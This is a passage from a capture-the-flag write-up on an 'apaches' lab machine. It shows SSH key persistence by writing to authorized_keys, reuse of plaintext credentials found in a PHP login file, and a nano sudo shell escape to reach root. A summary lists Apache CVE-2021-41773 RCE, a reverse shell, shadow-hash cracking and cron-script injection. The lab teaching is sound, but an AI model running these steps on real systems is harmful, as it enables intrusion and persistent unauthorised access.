##########%%%%%%&%&&&&&%,,,,,,*******//((######%%%%%%%%#(,,*/,,,,,,,,,,*,,,,,,,,,,,,,,,,,,
###########%%%%%&&&&&&%*,,,,*****////(((######%%%%%%%%%%%#/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
#######%%%%%%%%&&&&&&&%,*,,*******,,**//((#####%%%%%%%%%%##/,,,,,,,,,,,,,*,,,,,,,,,,,,,,,,
###%%%%%%%%%%%%&&&&&&&&(,,,*******/((/*/*//(######(((#%%%###,,,,,,,,,,,,,,,,,,,,,,,,,,/,,,
###%%%%%%%%%%%%&&&&&&&&,,,***//*///,.(,,**(#%%%#(*,**(#%%%%#,*#/,,,,,,,,,,,,,,,,,,,,,,,,,,
###%%%%%%%%%%%&%&&&&&&,,***///(#######(**/#%&&%%#%,/&##(%%%#(##****,,,,,,,,,,,,,*,,,,,,,,,
##%%%%%%%%%%%&&&&&&&%/,,,,*///(#####((///(%&%%%%%%%%%%%%&%%###/,*,,,,,,,,,,,,,,,,,,,,,,,,,
#%%%%%%%%%%%%&&&&&&&%(/,,,**////(((((***(#&&%%%%%%%%%%%%%%%%%#/***,,,,,,,,,,,,,,,,,,,,,,,,
##%%%%%%%%%%%%%&&&&&%#(//***////((((***//#%&&%%%%%%%%%%%%%(%#,*/**,,,,,,,,,,,,,,,,,,,,,,,,
###%%%%%%%%%%%%%&%%#(#((/*,//////(/******/##//%%%%%%%%%%%%%*,,,/***,,,,,,,,,,,,,,,,,,,,,,,
####%%%%%%%%%%%%%%%*((//(,#///////////(#%#%%%%&&%%%%%%%%#%%%,,*/*,,,,,,,,,,,,,,,,,,,,,,,,,
#####%%%%%%%%%&%%%.//#(/,.%%/////*,,,*,**((#%%%%%%%%%%%(%%/%,,*(*,,,,,,,,,,,,,,,,,,,,,,,,,
#####%%%%%%%%%&%,*(###(*%%%&&#//*****/(####%%%%%%%%%%%/,%#,,,,,/*,,,,,,,,,,,,,,,,,,*,,,,,,
######%%%%%%%%&((####(*#%%%#*,,,******//*((###%%%%%%#*,/%%/,,,,/,,,,,,,,,,,,,,,,,,,,,,,,,,
######%%%%%%%%(,(#//,*,%%%#*,*,.,,***/((#########.//#/(%%%((,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,
#######%%%%%%,,##(%#/%&%%/*,*,,.,*###(**///(,,,,,*((#/%%&(,,,,,,(###%&&&,*,,,,,,,,,,,,,,,,
########%%%%,/#%#%%%,(//*,,**,..,,,,,,,,,,/%,,,,/#%##&%&#,,,,,**/*/%#%(&%#**,,,,,,,,,,,,,,
#########(/,,*,/%%&,,*,**,*,/,,,,,,,,,,*/,##**,#*%#%%%&&#/(,,.,*/***/*(%##%%/(%//%#*,,,,,,
######(,,,,,,####%,,*///,/*,,,,,,,*,,,##%***,(/#*#((&&&&&/*,,,,,,,***,%%//(%%%%%%%(#&,*,,*
(###/,,,,,,,##%%&.,*,#///(,(/,,,,,*,***//**./*##(#(#%%%%&****,,*,,,**,#%%***//(%(%/%#,,,,*
###*,,,,,,,#%#&%#,*,#(#/%#((#&,*****///,&%(%(%%#,#*&&&&&*/*/*,,.,,,**///*,*,**///%(%/%/*,,
((,,,,,.,,/**/%%,*,##%(%%/(%&*,,**//(/*,,%*%%%/#(#%&&&(&***,,,.,**////*,,,**///,##(#%%%%
/,,.,,,,,##(%&,,,,#/%%/%/(#%*,,,**///*,%(.%#%%%,/#%(&&#&,*/*,,,..,,*////*,,,,/,%%*//%%(///
.,,...,,,#(%%(,**(/%%#%%#%%%,,**///*,%%,.#*/%#,*#((&(###,/,,.,...*,.,///*,,,*/,(%,*(###%(/
,,....,,/#(%%,(/(##&%#%*/%*%.,*///*%#(.#%.%/%%*(&&,&%%#*,,,,,,,.,/,..,/,#%/,**,,,,*/###%##
.,,,,,,,(*/(#/(((%&*####/%#%(,//,,%%&*&(#%,/#//%%%&&%&%,*,,.,,,,.*/.,,/*,,,,//,,,.#%(%%%%&
*(,,,,*(%(#/(/,(#%.%#%/##%,&,*/*%%/%&.%(%/%%#,##((##%&#,/,/,.,*,/,/,.,*/*,,*/,,,,,#%&%%%%&
.,,*,,###%#(#*#(%&&#%%#(%&,%,*%&*%&,,#(%,%(%//&(&&&%%%&*(,*,,,,,*,*/.,**,,,*/.,,,*///%%%#&
,,,,,,/#%%*(,(##%//#(,/,(**/#///(/((%*%%/%*%*#&&&%&&,%/,#,,(/.,,.,,/,,,*,*****,,*///#%%%%%
,,,,/#*#(###%%#&/&#%(%/%&,%/,%&#%,%%*&&*%,%**(%&&&&&,&(,#,*,,,,,,*(*/,,,%%/*,*,*//((#%%%%%
,/,#(#%#%#%%#%&%&#%%%&%&,#&,%&(%&*%&&&/%&%%/%%(%##%%&&*%&,,/*,,*/,***,,(#%(,,,*/(((,%%%(%&
,.((%%#%#%%#%%&%&%&%&%&&%&%(&%%&,%&/%&%&(%%%&(%&&&&/&&(&%/(/(*,*(%,//,,,*,,,%%*(((,#%%&#&&
,*/#%%%#%##%#%#&%&#&#&&(&&,&&%&&%&%&&(&%&&*&&&&&&&&&&(%&/#///,,,/%%(/*,*,,/%%&(((////%%/%%
(/%(###%(%%#&#%#&&&&%&/&&(&&#%&(&&%&%&&%%#%(&&&&&&%&&%&&%&(/*(,*/(*//*,,,,,,*(((,#&/*%%%##
#%((#%%#%#%%%%&%&%&%&&%&&(&&%&%%&#&&%&#&&/&&#%%%&&&&%&&%&&#(/((,,**(/*,,,,**,#%,,%%//%%%%#
%###%#%%#%#%#%#%(&%&&(&&,%&%&&%&&%&#&&%&%%%&%&&&&&&&%&&%&&%(/*,***/((/,,,,*,,#%%,**%%%%&%#
(####%#%%%%#%%%&%&%&#%%%%&%%&(&&%&&%&(%%(&&&&&&&&&&%%&%%&%&&*(#/(///(&%%,/,.#%*%%*,,,/&&##
(/(##(%/%(%#&(&/%(&&#&&*%&%&&%&#&&#&&%%##%#%%&&&%&&%&&%&&%&&///*,,/,(%,,,*,,(&****,,,*%&#*
##%/%##%(%/%(&#%&%&*%&*%&(%&*&&%&%%&*%%*%%&&&%&&&&&&&#&&#&&*******,,,(,,,**//***,,,,,*%%#*
,,,,****(&#&/&/&*%#%&/*&&#&#%&,%&/&%/%%#&&%&&&&(&&(&&%&&%&&,,/(,**,,,,,,*****,,,,,,,,**%**
(%%(%/%*%,&,%(%/(/**#/#&*&&*&##&*%&,%%&&&&&&&&&#&%%&(%&(&&,,,*,,*,,,,,,,****,,,,,,,,,,(#*,


You are on fire!!

Flag: Fla[REDACTED]
```

---

## SSH Access as Sacagawea

An SSH key pair was generated for persistent authentication:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ ssh-keygen -t rsa -b 4096 -f ./id_rsa
Generating public/private rsa key pair.
Enter passphrase for "./id_rsa" (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:UhVXOMV2fntMN+S4BrroQZJyWPei+WbZvA4Y+/DEF3o ouba@CLIENT-DESKTOP
The key's randomart image is:
+---[RSA 4096]----+
|          o..=o  |
|         . .o o..|
|     . ..    o+o |
|    o o..  . . o=|
|   o =.oSo. . .o=|
|    o X.o..  o .o|
|     * *=E. .   .|
|      *==+       |
|      +=.o.      |
+----[SHA256]-----+

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoUNLiXKo7VD/VjLpq5mBdGSgGdnrDojUthwupOsF660cZ9ItoxugFnF3ACzT68ztt62aY7Q4Ol2hUpYLSJVsfz3/QRGyWsY+LYscVOnmJKZrcqoCf8RPLvQvZJz/ic1chfHribQuF8MTj0QI5Wlt2sRNsf2SYrp6Vs0s57ZyV9XEqdPOsX4Cu8QerqBCcWdHDFuq9Dc0xpCpVYwbjf33BTHuRSxYPsOjrwmJdcyG68L0e/9segNBIKOW15dZMvo/amWqwBh89IDsqw9laVr9rWx/J07B2xupc/BE7+W7bYwmF/4D0srdGjBvPu0u1QsoXJ5xqSe7QcbljxLT4iNyYhQ5vPFdBpR91nuEX7sX/EW9paBppav5UvsarEEV6kDfSCGhcLSAKgY9w4nvk17/fTvxiybDdFp18+UMjlCLD5UG2mmcrvZhIcfh+nSWfaODceqL2KsHaQng8yPjnb1I17Sn0HNDCP+O16hB3kokTI15W586BniHPrdjyERmnweVntBGRgreaIAMsBC70hvPUs++hQwwi7XINEgNNtnO+0TBCU5ELY849ZkwzD8U8Cemc1icHdqQ4hbrlalBFaOdFM2SOhXeiKPnUx2ryPoGlVxgSPE+RqD3iLWi7mBYVAjtUeXLGD8IJhsTd8CfRx+XnFOG08cZZ/SIN/IpVPNHEJw== ouba@CLIENT-DESKTOP
```

The public key was added to sacagawea's authorized_keys file:

```bash
sacabash-5.0$ mkdir /home/sacagawea/.ssh
sacabash-5.0$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCoUNLiXKo7VD/VjLpq5mBdGSgGdnrDojUthwupOsF660cZ9ItoxugFnF3ACzT68ztt62aY7Q4Ol2hUpYLSJVsfz3/QRGyWsY+LYscVOnmJKZrcqoCf8RPLvQvZJz/ic1chfHribQuF8MTj0QI5Wlt2sRNsf2SYrp6Vs0s57ZyV9XEqdPOsX4Cu8QerqBCcWdHDFuq9Dc0xpCpVYwbjf33BTHuRSxYPsOjrwmJdcyG68L0e/9segNBIKOW15dZMvo/amWqwBh89IDsqw9laVr9rWx/J07B2xupc/BE7+W7bYwmF/4D0srdGjBvPu0u1QsoXJ5xqSe7QcbljxLT4iNyYhQ5vPFdBpR91nuEX7sX/EW9paBppav5UvsarEEV6kDfSCGhcLSAKgY9w4nvk17/fTvxiybDdFp18+UMjlCLD5UG2mmcrvZhIcfh+nSWfaODceqL2KsHaQng8yPjnb1I17Sn0HNDCP+O16hB3kokTI15W586BniHPrdjyERmnweVntBGRgreaIAMsBC70hvPUs++hQwwi7XINEgNNtnO+0TBCU5ELY849ZkwzD8U8Cemc1icHdqQ4hbrlalBFaOdFM2SOhXeiKPnUx2ryPoGlVxgSPE+RqD3iLWi7mBYVAjtUeXLGD8IJhsTd8CfRx+XnFOG08cZZ/SIN/IpVPNHEJw== ouba@CLIENT-DESKTOP' > /home/sacagawea/.ssh/authorized_keys
sacabash-5.0$ chmod 600 /home/sacagawea/.ssh/authorized_keys
sacabash-5.0$ chmod 700 /home/sacagawea/.ssh
```

SSH access was established as the sacagawea user:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/apaches]
└─$ ssh sacagawea@$ip -i id_rsa
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html




                                                                         >>       >======>         >>           >=>    >=>    >=> >=======>   >=>>=>
                                                                        >>=>      >=>    >=>      >>=>       >=>   >=> >=>    >=> >=>       >=>    >=>
                                                                       >> >=>     >=>    >=>     >> >=>     >=>        >=>    >=> >=>        >=>
                           ~                                          >=>  >=>    >======>      >=>  >=>    >=>        >=====>>=> >=====>      >=>
                     7~   ~&.                                        >=====>>=>   >=>          >=====>>=>   >=>        >=>    >=> >=>             >=>
                     G!J !75!   ~G     :                            >=>      >=>  >=>         >=>      >=>   >=>   >=> >=>    >=> >=>       >=>    >=>
                    ?~:B!. 5Y^!~^B. :~J&                           >=>        >=> >=>        >=>        >=>    >===>   >=>    >=> >=======>   >=>>=>
                  .GG?~    B^...PB?!^ ?5 .
                 7&G:  7. JB7?7^..   ^&P&Y .7#                     If at first you don't succeed. Try, try again! Sometimes the second time returns more!
               .GG.  ~J. ?@5:  :~.  Y@@@@??!?#
              :#~  ~Y~  JJ  :77: .J&@#57:  :&!.~Y  .:
             :&. ^P7  ^J::!7^.:!YJ!:....  Y@@@@@&J5@!
             @7 Y5  :GP77~::~!~...:^:..:J#&#GPJ!:.PG
            P@~B# ^B@G~^^!!~^^^^:...^7J7.       ^BP^?:
           ^@@@@@&@#~7G5J7~::.:^~?JJ7~::^^~~~?B@@@@@&
           &J!7?P#@B@@@B!:!?77???7!~~!!?J5PPP5YJ??YPYJ~.
          ?P       :?B@&#@#?7!^^~?55Y7^:..       .^?J5Y^
          ?B^^^::..    ~G&@#YP#&@B!....::::^~75B&@@@@#G!
          :&~J?P&@@G?7!^..BG!~7B@#5J7!!7?JPGBB#BB&&@@B^
          !5 ##J?PY    :JP&    .@&G5JY5GG57^:...   .~YBJ
         ~5  :P7!^ ..^   ~@P~~~BB7^:.  .:~5G! .:!5B&@G!!.
        .P      ~PGB#5   P:5!B&7~:Y&#&B&&#GPY7!!?5B@@&G:
        Y7   ^^ .5GGB!  5~!7:7!G:. 7B7?~^^?G#P!....:GP
        .~^JJ^   .     .G #..J ##!  J#~..:.  .7P#?^:.
           !Y:^. ?.    ~Y &  7 PJ!P7^@@&Y!^^.  .J&Y
            P!         ~P @. : Y&  5GPJ#??~~?#G!!!7.
            !?       ^?J&.#J   B##: .  B7:.   5^
             !!^.:!PP^  !G!&.  5^7?J   ?#:~~^.:B^
               .::..!?   .!JG. &^  BG~.:@       .
                     JG!!^..5YYG5^ &..~Y&
                    .G...^?~  .  JB!    .
                    .G!7!:

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

   System information as of Mon 13 Apr 2026 08:01:41 PM UTC

   System load:  0.13               Processes:               142
   Usage of /:   20.0% of 39.07GB   Users logged in:         0
   Memory usage: 14%                IPv4 address for enp0s3: 192.168.100.170
   Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
    just raised the bar for easy, resilient and secure K8s cluster deployment.

    https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 143 updates can be installed immediately.
 2 of these updates are security updates.
 To see these additional updates run: apt list --upgradable

 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr 13 19:58:17 2026 from 192.168.100.1
sacagawea@apaches:~$ id
uid=1002(sacagawea) gid=1002(sacagawea) groups=1002(sacagawea),1004(Lipan)
```

---

## Source Code Examination and Credential Discovery

The Development folder in sacagawea's home directory was examined to discover application credentials:

```bash
sacagawea@apaches:~$ cd Development/
sacagawea@apaches:~/Development$ ls
admin  css  fonts  images  index.html  js  robots.txt
sacagawea@apaches:~/Development$ cd admin/
sacagawea@apaches:~/Development/admin$ ls -la
total 24
drwx------ 2 sacagawea sacagawea 4096 Oct  6  2022 .
drwxrwxr-x 7 sacagawea sacagawea 4096 Oct 10  2022 ..
-rwx------ 1 sacagawea sacagawea  689 Oct  6  2022 1a-login.php
-rwx------ 1 sacagawea sacagawea  724 Oct 24  2020 1b-login.css
-rwx------ 1 sacagawea sacagawea  773 Oct 10  2022 2-check.php
-rwx------ 1 sacagawea sacagawea  267 Nov  5  2021 3-protect.php
```

The PHP login check file contained plaintext credentials for all application users:

```bash
sacagawea@apaches:~/Development/admin$ cat 2-check.php
<?php
// (A) START SESSION
session_start();

// (B) HANDLE LOGIN
if (isset($_POST["user"]) && !isset($_SESSION["user"])) {
  // (B1) USERS & PASSWORDS - SET YOUR OWN !
  $users = [
    "geronimo" => "12u7D9@4IA9uBO4pX9#6jZ3456",
    "pocahontas" => "y2U1@8Ie&OHwd^Ww3uAl",
    "squanto" => "4Rl3^K8WDG@sG24Hq@ih",
    "sacagawea" => "cU21X8&uGswgYsL!raXC"
  ];

  // (B2) CHECK & VERIFY
  if (isset($users[$_POST["user"]])) {
    if ($users[$_POST["user"]] == $_POST["password"]) {
      $_SESSION["user"] = $_POST["user"];
    }
  }

  // (B3) FAILED LOGIN FLAG
  if (!isset($_SESSION["user"])) { $failed = true; }
}

// (C) REDIRECT USER TO HOME PAGE IF SIGNED IN
if (isset($_SESSION["user"])) {
  header("Location: index.php");
  exit();
}
```

---

## Lateral Movement to Pocahontas

Using the pocahontas credentials discovered in the source code, authentication was attempted:

```bash
sacagawea@apaches:~/Development/admin$ su - geronimo
Password:
su: Authentication failure
sacagawea@apaches:~/Development/admin$ su - sacagawea
Password:
su: Authentication failure
sacagawea@apaches:~/Development/admin$ su - pocahontas
Password:
pocahontas@apaches:~$ id
uid=1003(pocahontas) gid=1003(pocahontas) groups=1003(pocahontas)
```

Sudo privileges were examined for the pocahontas user:

```bash
pocahontas@apaches:~$ sudo -l
[sudo] password for pocahontas:
Matching Defaults entries for pocahontas on apaches:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pocahontas may run the following commands on apaches:
    (geronimo) /bin/nano
```

---

## Privilege Escalation via Nano GTFOBins

The pocahontas user could execute the nano editor as geronimo without a password. This was exploited using a known nano GTFOBins technique:

```bash
pocahontas@apaches:~$ sudo -u geronimo /bin/nano -s /bin/bash
```

![](image-1.png)

A shell was executed as the geronimo user:

```bash
geronimo@apaches:/home/pocahontas$ id
uid=1000(geronimo) gid=1000(geronimo) groups=1000(geronimo),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
```

---

## Root Access

The geronimo user was a member of the sudo group, granting unrestricted sudo access:

```bash
geronimo@apaches:/home/pocahontas$ sudo -i
root@apaches:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
apaches
root@apaches:~# cat /home/sacagawea/user.txt /root/root.txt

                                                                                                      
  _____ _                      __
 |  ___| | __ _  __ _    ___  / _|  ___  __ _  ___ __ _  __ _  __ ___      _____  __ _
 | |_  | |/ _` |/ _` |  / _ \| |_  / __|/ _` |/ __/ _` |/ _` |/ _` \ \ /\ / / _ \/ _` |
 |  _| | | (_| | (_| | | (_) |  _| \__ \ (_| | (_| (_| | (_| | (_| |\ V  V /  __/ (_| |
 |_|   |_|\__,_|\__, |  \___/|_|   |___\__,_|\___\__,_|\__, |\__,_| \_/\_/ \___|\__,_|
                 |___/                                   |___/




****(************************************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,.*,,,,,,
**/*******************/****************.,.,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,,,,,,
***************************************.,%/*,,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,%,,,,,
//////////////////////***********************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/%,,,,
////////////////////////////****************,,,,,,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(,,,
/////////((((((((((((((////(//////*************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,,
////(((((((((((((((((((((((((///////**********,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/,
//((((((((((###########((((((((/////(*************,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*,,
(((((((((####################(((((((/*,,,,,,,,//,,,,//,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
(((((((((%########%###%######((((,,,,,,,,,,,*(/(,,,**/((/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
((((((########%%%%%%%%%%%%%###,,,,,,,,,,,,,,*((/,,,,*((((((*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
((((((########%%%%%%%%%%%%%%,,,,,,,,,,,,,,**/(//,,,,//(((/(//*,,,,,,,,,,,,,,,,,,,,,,,,,,,,
(((((########%%%%%%%%%%%%%#,,,,,,,,,,,,,,,*((/**,,*///(((//*****,,,,*,,,,,*,,,,,,,,,,,,,,,
((((########%%%%%%%%%%%%%(,,,,,,,,,,,,,,*,****/((**//((///***,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
(((#######%%%%%%%%%&&%%%%,,,,,,,,,,,**//(((#((##%#((((((/*,,,,,,,,,,,**,,,,,,,,,,,,,,,,,,,
##########%%%%%%%%%%&%%%,,,,,,,,,*,***((########%%%%%(/*/*(,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,*
##########%%%%%%&%&&&&&%,,,,,,*******//((######%%%%%%%%#(,,*/,,,,,,,,,,*,,,,,,,,,,,,,,,,,,
###########%%%%%&&&&&&%*,,,,*****////(((######%%%%%%%%%%%#/,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
#######%%%%%%%%&&&&&&&%,*,,*******,,**//((#####%%%%%%%%%%##/,,,,,,,,,,,,,*,,,,,,,,,,,,,,,,
###%%%%%%%%%%%%&&&&&&&&(,,,*******/((/*/*//(######(((#%%%###,,,,,,,,,,,,,,,,,,,,,,,,,,/,,,
###%%%%%%%%%%%%&&&&&&&&,,,***//*///,.(,,**(#%%%#(*,**(#%%%%#,*#/,,,,,,,,,,,,,,,,,,,,,,,,,,
###%%%%%%%%%%%&%&&&&&&,,***///(#######(**/#%&&%%#%,/&##(%%%#(##****,,,,,,,,,,,,,*,,,,,,,,,
##%%%%%%%%%%%&&&&&&&%/,,,,*///(#####((///(%&%%%%%%%%%%%%&%%###/,*,,,,,,,,,,,,,,,,,,,,,,,,,
#%%%%%%%%%%%%&&&&&&&%(/,,,**////(((((***(#&&%%%%%%%%%%%%%%%%%#/***,,,,,,,,,,,,,,,,,,,,,,,,
##%%%%%%%%%%%%%&&&&&%#(//***////((((***//#%&&%%%%%%%%%%%%%(%#,*/**,,,,,,,,,,,,,,,,,,,,,,,,
###%%%%%%%%%%%%%&%%#(#((/*,//////(/******/##//%%%%%%%%%%%%%*,,,/***,,,,,,,,,,,,,,,,,,,,,,,
####%%%%%%%%%%%%%%%*((//(,#///////////(#%#%%%%&&%%%%%%%%#%%%,,*/*,,,,,,,,,,,,,,,,,,,,,,,,,
#####%%%%%%%%%&%%%.//#(/,.%%/////*,,,*,**((#%%%%%%%%%%%(%%/%,,*(*,,,,,,,,,,,,,,,,,,,,,,,,,
#####%%%%%%%%%&%,*(###(*%%%&&#//*****/(####%%%%%%%%%%%/,%#,,,,,/*,,,,,,,,,,,,,,,,,,*,,,,,,
######%%%%%%%%&((####(*#%%%#*,,,******//*((###%%%%%%#*,/%%/,,,,/,,,,,,,,,,,,,,,,,,,,,,,,,,
######%%%%%%%%(,(#//,*,%%%#*,*,.,,***/((#########.//#/(%%%((,,,,*,,,,,,,,,,,,,,,,,,,,,,,,,
#######%%%%%%,,##(%#/%&%%/*,*,,.,*###(**///(,,,,,*((#/%%&(,,,,,,(###%&&&,*,,,,,,,,,,,,,,,,
########%%%%,/#%#%%%,(//*,,**,..,,,,,,,,,,/%,,,,/#%##&%&#,,,,,**/*/%#%(&%#**,,,,,,,,,,,,,,
#########(/,,*,/%%&,,*,**,*,/,,,,,,,,,,*/,##**,#*%#%%%&&#/(,,.,*/***/*(%##%%/(%//%#*,,,,,,
######(,,,,,,####%,,*///,/*,,,,,,,*,,,##%***,(/#*#((&&&&&/*,,,,,,,***,%%//(%%%%%%%(#&,*,,*
(###/,,,,,,,##%%&.,*,#///(,(/,,,,,*,***//**./*##(#(#%%%%&****,,*,,,**,#%%***//(%(%/%#,,,,*
###*,,,,,,,#%#&%#,*,#(#/%#((#&,*****///,&%(%(%%#,#*&&&&&*/*/*,,.,,,**///*,*,**///%(%/%/*,,
((,,,,,.,,/**/%%,*,##%(%%/(%&*,,**//(/*,,%*%%%/#(#%&&&(&***,,,.,**////*,,,**///,##(#%%%%
/,,.,,,,,##(%&,,,,#/%%/%/(#%*,,,**///*,%(.%#%%%,/#%(&&#&,*/*,,,..,,*////*,,,,/,%%*//%%(///
.,,...,,,#(%%(,**(/%%#%%#%%%,,**///*,%%,.#*/%#,*#((&(###,/,,.,...*,.,///*,,,*/,(%,*(###%(/
,,....,,/#(%%,(/(##&%#%*/%*%.,*///*%#(.#%.%/%%*(&&,&%%#*,,,,,,,.,/,..,/,#%/,**,,,,*/###%##
.,,,,,,,(*/(#/(((%&*####/%#%(,//,,%%&*&(#%,/#//%%%&&%&%,*,,.,,,,.*/.,,/*,,,,//,,,.#%(%%%%&
*(,,,,*(%(#/(/,(#%.%#%/##%,&,*/*%%/%&.%(%/%%#,##((##%&#,/,/,.,*,/,/,.,*/*,,*/,,,,,#%&%%%%&
.,,*,,###%#(#*#(%&&#%%#(%&,%,*%&*%&,,#(%,%(%//&(&&&%%%&*(,*,,,,,*,*/.,**,,,*/.,,,*///%%%#&
,,,,,,/#%%*(,(##%//#(,/,(**/#///(/((%*%%/%*%*#&&&%&&,%/,#,,(/.,,.,,/,,,*,*****,,*///#%%%%%
,,,,/#*#(###%%#&/&#%(%/%&,%/,%&#%,%%*&&*%,%**(%&&&&&,&(,#,*,,,,,,*(*/,,,%%/*,*,*//((#%%%%%
,/,#(#%#%#%%#%&%&#%%%&%&,#&,%&(%&*%&&&/%&%%/%%(%##%%&&*%&,,/*,,*/,***,,(#%(,,,*/(((,%%%(%&
,.((%%#%#%%#%%&%&%&%&%&&%&%(&%%&,%&/%&%&(%%%&(%&&&&/&&(&%/(/(*,*(%,//,,,*,,,%%*(((,#%%&#&&
,*/#%%%#%##%#%#&%&#&#&&(&&,&&%&&%&%&&(&%&&*&&&&&&&&&&(%&/#///,,,/%%(/*,*,,/%%&(((////%%/%%
(/%(###%(%%#&#%#&&&&%&/&&(&&#%&(&&%&%&&%%#%(&&&&&&%&&%&&%&(/*(,*/(*//*,,,,,,*(((,#&/*%%%##
#%((#%%#%#%%%%&%&%&%&&%&&(&&%&%%&#&&%&#&&/&&#%%%&&&&%&&%&&#(/((,,**(/*,,,,**,#%,,%%//%%%%#
%###%#%%#%#%#%#%(&%&&(&&,%&%&&%&&%&#&&%&%%%&%&&&&&&&%&&%&&%(/*,***/((/,,,,*,,#%%,**%%%%&%#
(####%#%%%%#%%%&%&%&#%%%%&%%&(&&%&&%&(%%(&&&&&&&&&&%%&%%&%&&*(#/(///(&%%,/,.#%*%%*,,,/&&##
(/(##(%/%(%#&(&/%(&&#&&*%&%&&%&#&&#&&%%##%#%%&&&%&&%&&%&&%&&///*,,/,(%,,,*,,(&****,,,*%&#*
##%/%##%(%/%(&#%&%&*%&*%&(%&*&&%&%%&*%%*%%&&&%&&&&&&&#&&#&&*******,,,(,,,**//***,,,,,*%%#*
,,,,****(&#&/&/&*%#%&/*&&#&#%&,%&/&%/%%#&&%&&&&(&&(&&%&&%&&,,/(,**,,,,,,*****,,,,,,,,**%**
(%%(%/%*%,&,%(%/(/**#/#&*&&*&##&*%&,%%&&&&&&&&&#&%%&(%&(&&,,,*,,*,,,,,,,****,,,,,,,,,,(#*,


You are on fire!!

Flag: Fla[REDACTED]


         █████╗ ██████╗  █████╗  ██████╗██╗  ██╗███████╗███████╗
        ██╔══██╗██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██╔════╝
        ███████║██████╔╝███████║██║     ███████║█████╗  ███████╗
        ██╔══██║██╔═══╝ ██╔══██║██║     ██╔══██║██╔══╝  ╚════██║
        ██║  ██║██║     ██║  ██║╚██████╗██║  ██║███████╗███████║
        ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝



            ............
                 ........,,,,,,,
                      ....,,,,.......
                            .............
                                 ............
         .................,,,,,,,,....     ........
                    , ,,,,,,,,,,,,............ .......
                                         .........  ....
                                        ..................
                                    ,,....................
                                  *,,,,,,,,,,,,,,,,,,,,,,.
                                 ***,,,,,,,,,,,,,,,,,,,,,.........
                                *****,,,,,,,,,,,,,,,,,,,.......,,,,,
                               /////**,,,,,,,,,,,,,,,,,,......,,,,,,.
                               ////////,******,,,,,,,,,......,,,,,,,,
                              ///////////*************.,,,,,,,,,,,,,
                              ////////////*********,,,....,,,,,,,,,,,
                               /////////////***,,,,,,........,,,,,,....
                              ./////******,,,,,,,,,,.....,......,,......
                              **********,,,,,,,,,,,,...,,,,.....,,........
                              *******,,,,,,,,,,,,,,..,,,,,,,.,,,,,,,.
                             ******,,,,,,,,,,,,,,,,,........,,,,,,,,,
                            ,****,,,,,,,,,,,,,,,,,,,,.......,,,,..,,,
                           ***,,,,,,,,,,,,,,,,,,,,,,,,.....,,......
                         ***,...,,,,,,,,,,,,,,,,,,,,,,,.............
                            ((,,,,,,,,,,,,,,,,,,,,,,,,,.
                          *((((((((,,,,,,,,,,,,,,,,,,,,
                                               ,,,,,,,,,,,
                                                  /,,,,..
                                                      ,...
                                                         ,.


                        Awesome, you have captured the root flag!!!!!

Flag: One[REDACTED]
```

Complete system compromise was achieved with full root-level access and both flags successfully captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified the target at 192.168.100.170 running Apache httpd 2.4.49 on port 80. Service enumeration confirmed the vulnerable version.

2. **Vulnerability Discovery**: CVE-2021-41773, a path traversal and remote code execution vulnerability in Apache 2.4.49, was identified using SearchSploit. A public exploit script was retrieved.

3. **Initial Exploitation**: The exploit was executed to establish remote code execution as the daemon user through path traversal in the cgi-bin directory.

4. **Reverse Shell**: A reverse shell was established using bash with Python pty pseudo-terminal upgrade for interactive shell access.

5. **System Enumeration**: Users, home directories, and shadow file contents were examined to identify privilege escalation paths.

6. **Credential Extraction**: Password hashes were extracted from the /etc/shadow file and processed using John the Ripper with the rockyou.txt wordlist, successfully cracking the squanto user's password.

7. **First Lateral Movement**: Authentication as squanto revealed group membership in the Lipan group, which possessed write access to sacagawea's cron backup script. Malicious commands were injected to create a setuid bash binary.

8. **Cron Exploitation**: The modified backup script was executed, creating a setuid bash shell with sacagawea's privileges, enabling escalation to that user.

9. **SSH Access**: SSH key-based authentication was configured for persistent access as the sacagawea user.

